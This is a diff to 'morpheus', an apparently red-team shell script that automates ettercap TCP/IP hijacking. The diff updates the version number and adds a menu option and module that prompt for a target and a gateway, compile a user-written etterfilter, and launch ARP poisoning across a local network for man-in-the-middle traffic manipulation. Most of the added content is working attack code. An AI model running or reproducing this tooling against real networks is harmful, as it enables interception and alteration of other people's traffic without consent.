@@ -1,7 +1,7 @@
 #!/bin/sh
 ###
 # morpheus - automated ettercap TCP/IP Hijacking tool
-# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.2
+# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.3
 # Suspicious-Shell-Activity (SSA) RedTeam develop @2016
 # codename: blue_dreams [ GPL licensed ]
 ###
@@ -104,7 +104,7 @@ done
 # Variable declarations
 # ---------------------
 dtr=`date | awk '{print $4}'`        # grab current hour
-V3R="1.2"                            # module version number
+V3R="1.3"                            # module version number
 DiStR0=`awk '{print $1}' /etc/issue` # grab distribution -  Ubuntu or Kali
 IPATH=`pwd`                          # grab morpheus.sh install path
 PrompT=`cat $IPATH/settings | egrep -m 1 "PROMPT_DISPLAY" | cut -d '=' -f2` > /dev/null 2>&1
@@ -142,8 +142,6 @@ ping -c 3 www.google.com | zenity --progress --pulsate --title "☠ MORPHEUS ☠
 # -----------------
 # START OF FUNTIONS
 # -----------------
-
-
 sh_stage1 () {
 cat << !
 ---
@@ -153,8 +151,7 @@ cat << !
 ---
 !
 sleep 2
-
-
+# run module?
 rUn=$(zenity --question --title="☠ MORPHEUS ☠" --text "Execute module?" --width 330) > /dev/null 2>&1
 if [ "$?" -eq "0" ]; then
 echo "good" > /dev/null 2>&1
@@ -163,6 +160,65 @@ else
   sleep 2
 fi
 }
+
+
+
+
+
+sh_stage9 () {
+cat << !
+---
+-- This module allow you to write your own filter.
+-- morpheus presents a 'template' previous build for you to write
+-- your own command logic and automate the compiling/lunch of the filter.
+---
+!
+sleep 2
+# run module?
+rUn=$(zenity --question --title="☠ MORPHEUS ☠" --text "Execute this module?" --width 330) > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+
+# get user input to build filter
+echo ${BlueF}[☠]${white} Enter filter settings! ${Reset};
+rhost=$(zenity --title="☠ Enter RHOST ☠" --text "example: $IP\nLeave blank to poison all local lan." --entry --width 300) > /dev/null 2>&1
+gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "example: 192.168.1.254\nLeave blank to poison all local lan." --entry --width 300) > /dev/null 2>&1
+
+  echo ${BlueF}[☠]${white} Backup files needed...${Reset};
+  cp $IPATH/filters/skelleton.eft $IPATH/filters/skelleton.bk > /dev/null 2>&1
+  sleep 1
+  echo ${BlueF}[☠]${white} Edit skelleton '(filter)'...${Reset};  
+  xterm -T "MORPHEUS - skelleton filter" -geometry 115x36 -e "nano $IPATH/filters/skelleton.eft"
+  sleep 1
+
+    # compiling skelleton.eft to be used in ettercap
+    echo ${BlueF}[☠]${white} Compiling skelleton...${Reset};
+    xterm -T "MORPHEUS - compiling" -geometry 100x30 -e "etterfilter $IPATH/filters/skelleton.eft -o $IPATH/output/skelleton.ef && sleep 3"
+    sleep 1
+
+      # run mitm+filter
+      echo ${BlueF}[☠]${white} Running ARP poison + etter filter...${Reset};
+      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework...${Reset};   
+      sleep 2
+      if [ "$IpV" = "ACTIVE" ]; then
+        echo ${GreenF}[☠]${white} Using IPv6 settings...${Reset};
+        ettercap -T -q -i $InT3R -F $IPATH/output/skelleton.ef -M ARP /$rhost// /$gateway//
+      else
+        echo ${GreenF}[☠]${white} Using IPv4 settings...${Reset};
+        ettercap -T -q -i $InT3R -F $IPATH/output/skelleton.ef -M ARP /$rhost/ /$gateway/
+      fi
+    
+
+  # clean up
+  echo ${BlueF}[☠]${white} Cleaning recent files...${Reset};
+  mv $IPATH/filters/skelleton.bk $IPATH/filters/skelleton.eft > /dev/null 2>&1
+  sleep 1
+
+else
+  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
+  sleep 2
+fi
+}
+
 
 
 sh_FAQ () {
@@ -221,6 +277,7 @@ echo -n "$PrompT"
 read choice
 case $choice in
 1) sh_stage1 ;;
+9) sh_stage9 ;;
 e) sh_exit ;;
 E) sh_exit ;;
 *) echo "\"$choice\": is not a valid Option"; sleep 2 ;;
